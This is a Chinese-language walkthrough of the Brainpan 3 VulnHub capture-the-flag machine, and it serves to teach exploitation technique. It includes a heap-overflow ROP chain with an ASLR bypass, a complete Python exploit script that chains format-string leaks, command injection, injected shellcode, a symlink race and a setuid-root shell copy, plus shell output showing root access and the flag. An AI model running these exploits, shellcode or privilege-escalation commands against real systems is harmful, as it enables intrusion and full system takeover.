puck
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub208.jpg)

#### 步骤6

现在，很吃力，需要完成认为是获得root shell的最后一步的工作。回到cronjob，需要分析msg_admin二进制文件。与加密二进制文件类似的方式将其从VM中提取。快速checksec

``` bash
root@kali:~/vulnhub/brainpan3/2# checksec msg_admin
[*] '/root/vulnhub/brainpan3/2/msg_admin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Canaries，NX上。ASLR开启了吗？

``` bash
$ cat /proc/sys/kernel/randomize_va_space
2
```

该抽出所有的止损了。从cronjob中，意识到二进制文件需要一个文件。静态分析二进制文件，看到文件需要包含名称行和由|分隔的消息。创建一个小的payload生成脚本来对此进行测试。

make-pwnmsg.py
``` bash
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, 'A'*10))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))
```

运行脚本之后，生成以下的文件

``` bash
root@kali:~/vulnhub/brainpan3/2# ls
bofh  bp3.py  brainpan.8  cryptor  make-pwnmsg.py  msg_admin  pwn.msg  report  shell  test.py  trixd
root@kali:~/vulnhub/brainpan3/2# cat pwn.msg 
aaaa|AAAAAAAAAA
bbbb|BBBBBBBBBB
bbbb|CCCCCCCCCC
```

在gdb中执行payload。

``` bash
pwndbg> r 1 pwn.msg
Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg
[+] Recording 3 entries
[+] Message from aaaa@kali

Program received signal SIGSEGV, Segmentation fault.
0xf7e48f36 in fputs () from /lib32/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 EAX  0xa
 EBX  0x804c300 ◂— 'bbbb'
 ECX  0x0
 EDX  0xffffbebe ◂— 0x0
 EDI  0xa
 ESI  0x0
 EBP  0xffffce68 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0
 ESP  0xffffce40 —▸ 0x804c300 ◂— 'bbbb'
 EIP  0xf7e48f36 (fputs+38) ◂— mov    eax, dword ptr [esi]
─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────
 ► 0xf7e48f36 <fputs+38>     mov    eax, dword ptr [esi]
   0xf7e48f38 <fputs+40>     and    eax, 0x8000
   0xf7e48f3d <fputs+45>     jne    fputs+100 <0xf7e48f74>
    ↓
   0xf7e48f74 <fputs+100>    movsx  edx, byte ptr [esi + 0x46]
   0xf7e48f78 <fputs+104>    test   dl, dl
   0xf7e48f7a <fputs+106>    jne    fputs+143 <0xf7e48f9f>
    ↓
   0xf7e48f9f <fputs+143>    mov    ecx, dword ptr [ebp - 0x1c]
   0xf7e48fa2 <fputs+146>    mov    ebx, dword ptr [esi + edx + 0x94]
   0xf7e48fa9 <fputs+153>    lea    eax, [ecx + 0xf80]
   0xf7e48faf <fputs+159>    lea    edx, [ecx + 0x1754]
   0xf7e48fb5 <fputs+165>    mov    ecx, ebx
──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ esp  0xffffce40 —▸ 0x804c300 ◂— 'bbbb'
... ↓
02:0008│      0xffffce48 —▸ 0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— ...
03:000c│      0xffffce4c —▸ 0xf7fb5000 ◂— 0x1d6d6c
04:0010│      0xffffce50 —▸ 0xffffcef8 —▸ 0xffffd0b8 —▸ 0xffffd2e8 ◂— 0x0
05:0014│      0xffffce54 —▸ 0xf7fe9450 ◂— pop    edx
06:0018│      0xffffce58 ◂— 0x0
07:001c│      0xffffce5c —▸ 0x804c300 ◂— 'bbbb'
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0 f7e48f36 fputs+38
   f 1  804892c record_data+271
   f 2  8048a89 notify_admin+193
   f 3  8048d4d main+664
   f 4 f7dfc811 __libc_start_main+241
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x0)
```

在静态分析中注意到了一些malloc。看看堆的布局。

``` bash
pwndbg> 
+0f30 0x804d908  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+0f70 0x804d948  00 00 00 00  11 00 00 00  01 00 00 00  60 d9 04 08  │....│....│....│`...│
+0f80 0x804d958  70 d9 04 08  11 00 00 00  61 61 61 61  00 00 00 00  │p...│....│aaaa│....│
+0f90 0x804d968  00 00 00 00  d1 00 00 00  41 41 41 41  41 41 41 41  │....│....│AAAA│AAAA│
+0fa0 0x804d978  41 41 00 00  00 00 00 00                            │AA..│....│    │    │
pwndbg> 
+0f90 0x804d980  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+1000 0x804d9f0  00 00 00 00  00 00 00 00                            │....│....│    │    │
pwndbg> 
+0fc0 0x804d9f8  00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00  │....│....│....│....│
...
+1000 0x804da38  00 00 00 00  11 00 00 00  01 00 00 00  50 da 04 08  │....│....│....│P...│
+1010 0x804da48  60 da 04 08  11 00 00 00  62 62 62 62  00 00 00 00  │`...│....│bbbb│....│
+1020 0x804da58  00 00 00 00  d1 00 00 00  42 42 42 42  42 42 42 42  │....│....│BBBB│BBBB│
+1030 0x804da68  42 42 00 00  00 00 00 00                            │BB..│....│    │    │
```

似乎的每条消息都在堆中背对背。看起来在消息之后还存在两个指针（请参见地址0x804d958和0x804da48）。消息和最后一个指针之间有多少可用空间。

``` bash
>>> 0x804da48 - 0x804d970
216
```

怀疑可以用A溢出两个指针，抛出数据以查看是否可以控制这些指针。

make-pwnmsg.py
``` bash
from pwn import *

with open('pwn.msg', 'w') as f:
    f.write('{}|{}\n'.format('a'*4, cyclic(216)))
    f.write('{}|{}\n'.format('b'*4, 'B'*10))
    f.write('{}|{}\n'.format('b'*4, 'C'*10))
```

在gdb中再次执行相同的payload。

``` bash
pwndbg> r 1 pwn.msg 
Starting program: /root/vulnhub/brainpan3/2/msg_admin 1 pwn.msg
[+] Recording 3 entries

Program received signal SIGSEGV, Segmentation fault.
0xf7e70bb2 in ?? () from /lib32/libc.so.6
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────
 EAX  0x62626262 ('bbbb')
 EBX  0x804c300 ◂— 'bbbb'
 ECX  0x804c300 ◂— 'bbbb'
 EDX  0x63616164 ('daac')
 EDI  0xf7fb5000 ◂— 0x1d6d6c
 ESI  0xffffd250 —▸ 0xf7ffdab0 —▸ 0xf7fce3e0 —▸ 0xf7ffd950 ◂— 0x0
 EBP  0xffffd2e8 ◂— 0x0
 ESP  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]
 EIP  0xf7e70bb2 ◂— mov    dword ptr [edx], eax
─────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────
 ► 0xf7e70bb2    mov    dword ptr [edx], eax
   0xf7e70bb4    mov    al, byte ptr [ecx + 4]
   0xf7e70bb7    mov    byte ptr [edx + 4], al
   0xf7e70bba    mov    eax, edx
   0xf7e70bbc    ret    
 
   0xf7e70bbd    lea    esi, [esi]
   0xf7e70bc0    mov    eax, dword ptr [ecx]
   0xf7e70bc2    mov    dword ptr [edx], eax
   0xf7e70bc4    mov    ax, word ptr [ecx + 4]
   0xf7e70bc8    mov    word ptr [edx + 4], ax
   0xf7e70bcc    mov    eax, edx
──────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────
00:0000│ esp  0xffffd0bc —▸ 0x8048cd0 (main+539) ◂— mov    eax, dword ptr [ebp - 0x4c]
01:0004│      0xffffd0c0 ◂— 'daac'
02:0008│      0xffffd0c4 —▸ 0x804c300 ◂— 'bbbb'
03:000c│      0xffffd0c8 —▸ 0x804c1a0 ◂— 0xfbad2488
04:0010│      0xffffd0cc ◂— 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
05:0014│      0xffffd0d0 ◂— 'baaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
06:0018│      0xffffd0d4 ◂— 'caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
07:001c│      0xffffd0d8 ◂— 'daaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'
────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────
 ► f 0 f7e70bb2
   f 1  8048cd0 main+539
   f 2 f7dfc811 __libc_start_main+241
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x63616164)
```

一定喜欢看到SIGSEGV，是吗？崩溃指令是mov [edx]，eax。看来正在用bbbb（eax-第二条消息）覆盖地址daac（edx-来自循环函数）中的数据。这实际上是“在哪里写”条件，在这里可以在任何地方写入4个字节的内容。查看0x8048cd0（在第1帧处的回溯），看到处于strcpy状态。在此处设置断点并重新启动：

``` bash
pwn> bp 0x8048ccb

[---------------------------------------CODE----------------------------------------]
=> 0x8048ccb <main+534>    call   0x8048630 <strcpy@plt>
    dest:      0x63616164 ('daac')
    src:       0x804c170 <-- 'bbbb'
```

在崩溃点，堆栈处于以下状态：

``` bash
[---------------------------------------STACK---------------------------------------]
00:0000| esp  0xffffc83c --> 0x8048cd0 (main+539) <-- mov    eax, dword ptr [ebp - 0x4c]
01:0004|      0xffffc840 <-- 0x63616164
02:0008|      0xffffc844 --> 0x804c170 <-- 'bbbb'
03:000c|      0xffffc848 --> 0x804c008 <-- 0xfbad2488
04:0010|      0xffffc84c <-- 'aaaabaaacaaadaa...'
05:0014|      0xffffc850 <-- 'baaacaaadaaaeaa...'
06:0018|      0xffffc854 <-- 'caaadaaaeaaafaa...'
07:001c|      0xffffc858 <-- 'daaaeaaafaaagaa...'
```

在堆栈地址看到了受控缓冲区0xffffc84c,为了将ESP移至缓冲区，需要执行堆栈枢纽操作，以便启动ROP序列。
将bbbb设置为从binjitsu（rop.search（move = 20）.address）移动20的堆栈地址，并将daac的偏移量设置为strtok GOT条目。

``` bash
from pwn import *

elf = ELF('msg_admin')
rop = ROP(elf)

pivot = rop.search(move=20).address
strtok = elf.got['strtok']

log.info("Pivot: {}".format(hex(pivot)))
log.info("Strtok: {}".format(hex(strtok)))

with open('pwn.msg', 'w') as f:
    sc = 'A' * cyclic_find('daac') + p32(strtok)
    sc += 'B' * (216 - len(sc))
    f.write('{}|{}\n'.format('a'*4, sc))
    f.write('{}|{}\n'.format(p32(pivot), 'B'*12))
```

太棒了，所以现在有了堆栈控制和EIP控制。;-)使用ROPGadget查看相关的ROP小工具。请注意，一定要增加--depth，以便可以看到更多小工具。在这种情况下，这一点很重要。没有它，将无法找到清晰的eax小工具。

``` bash
$ ROPgadget --depth 30 --binary msg_admin
```

列表中的两个小工具非常有趣。下面的小工具将允许使用取消引用的指针来增加eax。

``` bash
0x08048feb : add eax, dword ptr [ebx + 0x1270304] ; ret
```

下一个小工具将提供清除eax的方法。请注意，从默认的ROPgadget设置--depth 10中看不到此小工具。

``` bash
0x08048790 : mov eax, 0x804b074 ; sub eax, 0x804b074 ; sar eax, 2 ; mov edx, eax ; shr edx, 0x1f ; add eax, edx ; sar eax, 1 ; jne 0x80487c1 ; ret
```

攻击计划如下（剧透警报，几乎与每个CTF ASLR旁路相同）：

 - 引用GOT中的条目。
 - 计算给定条目和系统之间的差异。
 - 将此差异添加到取消引用的值中。
 - 调用system（'/tmp/foo'），其中/tmp/foo包含我们的命令。

因为要减少添加偏移量指令的数量，所以尝试在msg_admin中找到哪个GOT条目最接近其libc中的系统。

find-good-addr.py
``` bash
from pwn import *

elf = ELF('msg_admin')
libc = ELF('libc.so.6')

for symbol in elf.symbols:
    try:
        if libc.symbols[symbol] < libc.symbols['system']:
            print symbol, hex(libc.symbols['system'] - libc.symbols[symbol])
    except:
        pass
```

``` bash
$ python find-good-addr.py 
__libc_start_main 0x26800
atol 0xe900
```

为了使事情更简单，将仅在GOT条目中添加正值。使用atol条目，因为它与系统的差异最小。接下来，需要在二进制文件中找到偏移量，该偏移量累积时等于0xe900。下面是一个可能的列表：

``` bash
0x8048595 = 0xc6e8
0x8048dff = 0x2203
0x8048833 = 0x14
0x8048fb9 = 0x1
```

现在有了系统偏移量，只需要一个小工具即可执行它。

``` bash
0x8048786 : call eax;
```

注意到在用法语句中找到了字符串/tmp/foo。利用它并将其用作执行命令。需要一个或两个命令，当以root身份执行时，将给一个shell。一种方法如下：

``` bash
cp /bin/sh /tmp/pwned;
chown root /tmp/pwned;
chmod 4777 /tmp/pwned;
```

需要将setuid位（4777）设置为puck，以便在root特权下执行二进制文件。一切准备就绪，检查一下最终的ROP链。

``` bash
def add_offset(addr):
    """Function used to easily add offsets to eax to global rop chain"""
    add_to_sum = 0x08048feb
    rop.raw(pop_ebx)
    rop.raw(addr - 0x1270304)
    rop.raw(add_to_sum)

rop = ROP(elf)
tmpfoo = elf.search('/tmp/foo').next()
atol = elf.got['atol']

pop_ebx = 0x804859d
call_eax = 0x8048786

hex_c6e8 = 0x8048595
hex_2203 = 0x8048dff
hex_14 = 0x8048833
hex_1 = 0x8048fb9

rop.raw(0x8048790)

add_offset(atol)
add_offset(hex_c6e8)
add_offset(hex_2203)
add_offset(hex_14)
add_offset(hex_1)

rop.raw(call_eax)    
rop.raw(tmpfoo)
```

根据先前的挑战，需要通过binjitsu执行这些挑战。

``` bash
r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
r.sendline('chmod +x /tmp/foo')

sc = str(rop)
sc += cyclic(cyclic_find('daac')-len(sc))
sc += p32(strtok)
sc += 'C' * (216 - len(sc))

data = ''
data += '{}|{}\n'.format('s'*4, sc) 
data += '{}|{}\n'.format(p32(pivot), str(rop))

pwnmsg_file = ''
for b in data:
    pwnmsg_file += '\\x{}'.format(b.encode('hex'))

r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
```

下面是完善后的一键获取root权限并且拿到flag的python脚本，运行一下看看效果。。。

bp3.py

``` bash
from pwn import *

HOST = '192.168.56.117'
PORT = 1337

r = remote(HOST, PORT)
r.sendline('%d.' * 6)
r.recvuntil("ACCESS CODE: ")
output = r.recv()
code = output.split('.')[2]
log.info("Code identified: {}".format(code))
r.sendline(code)
r.sendline('3')
shellcode = '%x.' * 70
r.clean()
r.sendline(shellcode)
r.recvuntil("SESSION: ")
session_name = r.recvuntil('\n').split('.')
n_index = session_name.index('4e')
log.info("Report 'N' at offset {}".format(n_index))
n_index = session_name.index('4e')
r.sendline('3')
r.sendline('Y' * (4*(n_index-2) + 1) )
for command in ['uname -a', 'whoami', 'id']:
    r.clean()
    r.sendline('1')
    r.sendline('$({} >&2)'.format(command))

    r.recvuntil("SENDING TO REPORT MODULE")
    output = r.recvuntil('[+]').split('\n')[2]
    log.success("{} - {}".format(command, output))
r.clean()
r.sendline('1')
r.sendline('$(/bin/bash -i >&2)')
offset = cyclic_find('baaa')
shellcode = 'A' * cyclic_find('baaa') + p32(0x804a080)
buffer = 116 - len(shellcode)
binsh_shellcode = asm(shellcraft.sh())
argv1 = '"A" * {} + "{}" + "C" * {}'.format(offset, r'\x80\xa0\x04\x08', buffer)
argv2 = ''.join('\\x{}'.format(enhex(binsh_shellcode)[x:x+2]) for x in xrange(0, len(enhex(binsh_shellcode)), 2))
actual_shellcode = """./cryptor $(python -c 'print {}') $(python -c 'print "{}"')""".format(argv1, argv2)
log.info(actual_shellcode)
r.sendline('cd /home/reynard/private')
while True:
    r.clean()
    r.sendline(actual_shellcode)
    r.clean()
    r.sendline('id')
    output = r.recv()
    if 'reynard' in output:
        break
log.info("Shell recevied: reynard")
r.sendline(""" echo "
import os
import socket
import telnetlib
import subprocess

HOST = 'localhost'
PORT = 7075

try:
    os.remove('/mnt/usb/key.txt')
except:
    pass

subprocess.check_output(['touch', '/mnt/usb/key.txt'])

r = socket.socket()
r.connect((HOST, PORT))

os.remove('/mnt/usb/key.txt')
os.symlink('/home/puck/key.txt', '/mnt/usb/key.txt')

t = telnetlib.Telnet()
t.sock = r
t.interact()

r.close()
" > win.py
""")
r.sendline("python win.py")
r.clean()
r.sendline("whoami")
output = r.recv()
log.success("Shell received: {}".format(output))
sleep(1)
log.success("Insert ROP pun here...")
elf = ELF('msg_admin')
rop = ROP(elf)
pivot = rop.search(move=20).address
strtok = elf.got['strtok']
rop = ROP(elf)
def add_offset(addr):
    """Function used to easily add offsets to eax to global rop chain"""
    add_to_sum = 0x08048feb
    rop.raw(pop_ebx)
    rop.raw(addr - 0x1270304)
    rop.raw(add_to_sum)
rop = ROP(elf)
tmpfoo = elf.search('/tmp/foo').next()
atol = elf.got['atol']
pop_ebx = 0x804859d
call_eax = 0x8048786
hex_c6e8 = 0x8048595
hex_2203 = 0x8048dff
hex_14 = 0x8048833
hex_1 = 0x8048fb9
rop.raw(0x8048790)
add_offset(atol)
add_offset(hex_c6e8)
add_offset(hex_2203)
add_offset(hex_14)
add_offset(hex_1)
rop.raw(call_eax)    
rop.raw(tmpfoo)
r.sendline('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
r.sendline('chmod +x /tmp/foo')
log.info('Create our root command file at /tmp/foo')
log.info('echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo')
log.info('chmod +x /tmp/foo')
sc = str(rop)
sc += cyclic(cyclic_find('daac')-len(sc))
sc += p32(strtok)
sc += 'C' * (216 - len(sc))
data = ''
data += '{}|{}\n'.format('s'*4, sc) 
data += '{}|{}\n'.format(p32(pivot), str(rop))
pwnmsg_file = ''
for b in data:
    pwnmsg_file += '\\x{}'.format(b.encode('hex'))
r.sendline('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
log.info('Create our malicious msg file')
log.info('''python -c "print '{}'" >> /opt/.messenger/pwn.msg'''.format(pwnmsg_file))
r.sendline('rm /tmp/pwned')
r.clean()
log.info("Wait for your r00t shellz")
for _ in xrange(75):
    r.sendline('ls -la /opt/.messenger')
    sleep(1)
    output = r.recv()
    if 'pwn.msg' not in output:
        break
r.sendline('/tmp/pwned')
r.sendline('id')
r.sendline('whoami')
r.sendline('cd /root')
r.sendline('gzip -d brainpan.8.gz')
r.sendline('cat brainpan.8')
for _ in xrange(10):
    r.sendline('')
log.info("Bingo!")
log.info(r.recv())
r.interactive()
```

直接获得root权限和flag，灰常的牛批。。。

``` bash
root@kali:~/vulnhub/brainpan3/2# python bp3.py 
[+] Opening connection to 192.168.56.117 on port 1337: Done
[*] Code identified: 8455
[*] Report 'N' at offset 65
[+] uname -a - Linux brainpan3 3.16.0-41-generic #55~14.04.1-Ubuntu SMP Sun Jun 14 18:44:35 UTC 2015 i686 i686 i686 GNU/Linux
[+] whoami - anansi
[+] id - uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)
[*] ./cryptor $(python -c 'print "A" * 4 + "\x80\xa0\x04\x08" + "C" * 108') $(python -c 'print "\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"')
[*] Shell recevied: reynard
[+] Shell received: Authentication successful
[+] Insert ROP pun here...
[*] '/root/vulnhub/brainpan3/2/msg_admin'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for 'msg_admin'
[*] Create our root command file at /tmp/foo
[*] echo "cp /bin/sh /tmp/pwned; chown root /tmp/pwned; chmod 4777 /tmp/pwned" > /tmp/foo
[*] chmod +x /tmp/foo
[*] Create our malicious msg file
[*] python -c "print '\x73\x73\x73\x73\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x61\x61\x61\x61\x62\x61\x61\x61\x63\x61\x61\x61\x64\x61\x61\x61\x65\x61\x61\x61\x66\x61\x61\x61\x67\x61\x61\x61\x68\x61\x61\x61\x69\x61\x61\x61\x6a\x61\x61\x61\x6b\x61\x61\x61\x6c\x61\x61\x61\x6d\x61\x61\x61\x6e\x61\x61\x61\x6f\x61\x61\x61\x70\x61\x61\x61\x71\x61\x61\x61\x72\x61\x61\x61\x73\x61\x61\x61\x74\x61\x61\x61\x75\x61\x61\x61\x76\x61\x61\x61\x77\x61\x61\x61\x78\x61\x61\x61\x79\x61\x61\x61\x7a\x61\x61\x62\x62\x61\x61\x62\x63\x61\x61\x62\x64\x61\x61\x62\x65\x61\x61\x62\x66\x61\x61\x62\x67\x61\x61\x62\x68\x61\x61\x62\x69\x61\x61\x62\x6a\x61\x61\x62\x5c\xb0\x04\x08\x0a\xdc\x8d\x04\x08\x7c\x90\x87\x04\x08\x9d\x85\x04\x08\x48\xad\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x91\x82\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xfb\x8a\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\x2f\x85\xdd\x06\xeb\x8f\x04\x08\x9d\x85\x04\x08\xb5\x8c\xdd\x06\xeb\x8f\x04\x08\x86\x87\x04\x08\xef\x8e\x04\x08\x0a'" >> /opt/.messenger/pwn.msg
[*] Wait for your r00t shellz
[*] Bingo!
[*] uid=1001(puck) gid=1004(dev) euid=0(root) groups=0
[*] Switching to interactive mode
(root)
$ 
root
gzip: brainpan.8.gz: No such file or directory
.TH man 8 "20 May 2015" "3.0" "brainpan 3"

.SH DESCRIPTION
Congratulations, you win! Thanks for playing!

.SH FLAG
.B
flag{tricksy-hobbitses-use-unix}

.SH BUGS
You found them all. 

.SH AUTHOR
superkojiman - 
.B
http://blog.techorganic.com

.SH TESTERS
Special thanks go to barrebas and Swappage taking the time to test Brainpan 3!
.br
barrebas - 
.B
https://twitter.com/barrebas
.br
Swappage - 
.B
https://twitter.com/Swappage
$ id
uid=1001(puck) gid=1004(dev) euid=0(root) groups=0(root)
$ whoami
root
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub209.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub210.jpg)

#### 方法二

虚拟机完全启动后，使用nmap进行端口扫描。这显示了1个开放端口1337和一个封闭（防火墙）端口8080，一旦连接到端口1337，将看到Brainpan Console的登录屏幕。

``` bash
root@kali:~# nc 192.168.56.117 1337


  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|
  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | 
  |   |  __ <    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | 
 ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|

                                                            by superkojiman




AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS

ACCESS CODE:
```

根据屏幕上的文字，必须处理一个4位数的代码，并且在3次失败的尝试之后，都会创建一个新的代码，因此很难对其进行暴力破解。想到的第一件事是它可能是格式字符串漏洞，并且经过快速测试表明确实如此。

``` bash
ACCESS CODE: %p%p%p
ERROR #1: INVALID ACCESS CODE: 0xbff1279c(nil)0x751

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 1

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

当使用格式字符串模式作为小数时，可以在位置3的输出中发现登录代码1873

``` bash
ACCESS CODE: %d-%d-%d-%d-%d-%d-%d
ERROR #1: INVALID ACCESS CODE: -1074714724-0-1873--1074714724-0-10--367016960

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 2

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

可以将格式字符串模式缩短为％3$d，以直接获取当前的登录代码

``` bash
ACCESS CODE: %3$d
ERROR #1: INVALID ACCESS CODE: 1873

ACCESS CODE MUST BE 4 DIGITS

FAILED LOGIN ATTEMPTS: 3

BRUTE-FORCE ATTEMPT DETECTED
PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN

AUTHORIZED PERSONNEL ONLY
PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN
A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS
```

使用代码登录到Brainpan控制台，显示一个菜单，展示一些选项，并设置了权限，例如AUTH，REPORT和MENU

``` bash
--------------------------------------------------------------
SESSION: ID-4057
  AUTH   [Y]    REPORT [N]    MENU   [Y]  
--------------------------------------------------------------


1  - CREATE REPORT
2  - VIEW CODE REPOSITORY
3  - UPDATE SESSION NAME
4  - SHELL
5  - LOG OFF

ENTER COMMAND:
```

最有趣的选项是1,2和3.。4显然是一个巨魔。
控制台使用选项1告诉我们该构建已禁用报告功能
选项2告诉我们该存储库现已可用
选项3允许我们更改会话名称。
看来此选项具有格式字符串和缓冲区溢出漏洞。
存储库选项使我想起8080处于关闭状态的端口，快速重新扫描显示该端口现已打开，当我们浏览至该端口时，我们会看到一个简单的网页。
我启动了一个目录bruteforce，它显示了名为“repo”的文件夹，其中包含5个文件。

输入2，然后再扫描8080端口，显示已经开启

``` bash
ENTER COMMAND: 2
SELECTED: 2

CODE REPOSITORY IS NOW AVAILABLE
```

``` bash
C:\Users\HASEE>nmap -p 8080 -v -sV 192.168.56.117 -r
PORT     STATE SERVICE VERSION
8080/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub201.jpg)

名为report的文件引起了我的注意，因为在Brainpan控制台中也有此report选项。我下载了文件并开始对其进行分析。

#### 分析report

提供所需的参数（报告数据和1或0）时，会得到一个很大的查理·布朗横幅，我不认识这个人，但我敢打赌，他是个好人。

``` bash
root@kali:~/vulnhub/brainpan3# ./report aa 0
               ____
           .-'&    '-.
          / __    __  \
         :-(__)--(__)--;
        (      (_       )
         :             ;
          \    __     /
           `-._____.-'
             /`"""`\
            /    ,  \
           /|/\/\/\ _\
          (_|/\/\/\\__)
            |_______|
           __)_ |_ (__
          (_____|_____)

       YOU'RE IN THE MATRIX
           CHARLIE BROWN
```

是时候对可执行文件使用ida进行逆向工程以查看发生了什么。

 - main

``` bash
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  int v4; // ST14_4
  char dest; // [esp+18h] [ebp-68h]
  unsigned int v6; // [esp+7Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  if ( argc > 2 )
  {
    cb();
    strcpy(&dest, argv[1]);
    v4 = atoi(argv[2]);
    P = (int)REPORT;
    N = (void *)(-sysconf(30) & (unsigned int)REPORT);
    mprotect(N, 0x1F4u, 7);
    if ( v4 )
    {
      sanitize(&dest);
      encrypt(&dest);
      record_data(&dest);
    }
    else
    {
      record_data(&dest);
      record_id(&dest);
    }
    printf("[+] RECORDED [%s]\n", &dest);
    result = 0;
  }
  else
  {
    printf("%s <report> [0|1]\n", *argv);
    result = 0;
  }
  return result;
}
```

 - sanitize

``` bash
int __cdecl sanitize(char *s)
{
  size_t i; // [esp+18h] [ebp-10h]
  int v3; // [esp+1Ch] [ebp-Ch]

  v3 = 0;
  for ( i = 0; i < strlen(s); ++i )
  {
    if ( !isalpha(s[i]) )
    {
      s[i] = 63;
      ++v3;
    }
  }
  return v3;
}
```

 - encrypt

``` bash
size_t __cdecl encrypt(char *s)
{
  unsigned int v1; // eax
  size_t result; // eax
  unsigned int i; // [esp+18h] [ebp-10h]
  int v4; // [esp+1Ch] [ebp-Ch]

  v1 = time(0);
  srand(v1);
  v4 = rand() % 9000 + 1000;
  for ( i = 0; ; ++i )
  {
    result = strlen(s);
    if ( i >= result )
      break;
    s[i] ^= v4;
  }
  return result;
}
```

 - record_data

``` bash
int __cdecl record_data(const char *a1)
{
  char *v1; // eax
  time_t timer; // [esp+2Ch] [ebp-5Ch]
  FILE *stream; // [esp+30h] [ebp-58h]
